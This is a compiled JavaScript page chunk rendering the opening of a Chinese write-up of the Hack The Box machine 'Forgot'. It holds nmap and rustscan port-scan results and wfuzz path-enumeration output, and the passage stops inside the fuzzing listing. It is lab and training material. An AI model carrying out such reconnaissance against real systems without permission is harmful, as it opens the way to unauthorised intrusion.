import{_ as d}from"./ValaxyMain.vue_vue_type_style_index_0_lang-DRVqeRiY.js";import{a as g,p as n,o,c as F,w as t,f as E,r as h,g as i,h as s}from"./app-CzjF7NIc.js";import"./YunFooter.vue_vue_type_script_setup_true_lang-17i98rOK.js";import"./YunCard.vue_vue_type_script_setup_true_lang-Da3dkqK-.js";import"./YunPageHeader.vue_vue_type_script_setup_true_lang-BsneHNVS.js";import"./index-C7yU5XnD.js";const C=i("h1",{id:"htb-forgot",tabindex:"-1"},[s("HTB：Forgot "),i("a",{class:"header-anchor",href:"#htb-forgot","aria-label":'Permalink to "HTB：Forgot"'},"​")],-1),c=i("h2",{id:"recon",tabindex:"-1"},[s("Recon "),i("a",{class:"header-anchor",href:"#recon","aria-label":'Permalink to "Recon"'},"​")],-1),y=i("p",null,"端口扫描结果",-1),u=i("p",null,"1.nmap扫描结果：",-1),B=i("div",{class:"language-shell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"shell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[i("code",{"v-pre":""},[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"PORT"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"   STATE"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," SERVICE")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"22/tcp"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," open"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"  ssh")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"53/tcp"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," open"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"  domain")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"80/tcp"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," open"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"  http")])])]),i("button",{class:"collapse"})],-1),_=i("ol",{start:"2"},[i("li",null,"rustscan扫描结果")],-1),m=i("div",{class:"language-shell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"shell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[i("code",{"v-pre":""},[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"PORT"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"   STATE"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," SERVICE"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," txt")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"22/tcp"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," open"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"  ssh"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"     syn-ack")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"53/tcp"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," open"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"  domain"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"  syn-ack")]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"80/tcp"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," open"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"  http"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"    syn-ack")])])]),i("button",{class:"collapse"})],-1),b=i("p",null,"子域名扫描：",-1),f=i("p",null,"wfuzz",-1),v=i("div",{class:"language-lua vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"lua"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code"},[i("code",{"v-pre":""},[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000000108"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"302"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        5"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L      "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"22"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"189"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "home"                                                                                                                      ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000000550"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"302"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        5"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L      "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"22"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"189"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "tickets"                                                                                                                   ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000005034"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"200"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        245"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L    "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"484"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W      "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"5189"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'     "login"                                                                                                                     ')]),s(`
`),i("span",{class:"line"}),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023937"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"283"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "darkeye"                                                                                                                   ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023938"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"284"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "locblog"                                                                                                                   ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023933"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"284"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "needlock"                                                                                                                  ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023936"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"283"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "crs"                                                                                                                       ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023935"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"283"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "krename"                                                                                                                   ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023932"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"283"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "newsfighter"                                                                                                               ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023929"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"283"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "using_libraries"                                                                                                           ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023931"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"283"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "anonynews"                                                                                                                 ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023952"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"284"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "oxine"                                                                                                                     ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023943"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"284"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "im2html"                                                                                                                   ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023947"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"283"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "1970_xeno"                                                                                                                 ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023950"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"284"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "cowloop"                                                                                                                   ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023941"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"283"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "sicons"                                                                                                                    ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023953"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"283"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "mesa"                                                                                                                      ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023954"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"284"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "blender"                                                                                                                   ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023956"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"284"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "devil"                                                                                                                     ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023955"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"284"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "cyberx3d-c"                                                                                                                ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023957"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"284"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "freewrl"                                                                                                                   ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023961"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"284"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "openvrml"                                                                                                                  ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023963"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"283"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "vrml2pov"                                                                                                                  ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023958"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"283"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "freewrlduneinputdevice"                                                                                                    ')]),s(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"000023959"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},":   "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"503"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"        14"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," L     "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"28"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," W       "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"284"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," Ch"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'      "libsball"                                                                                                                  ')]),s(`
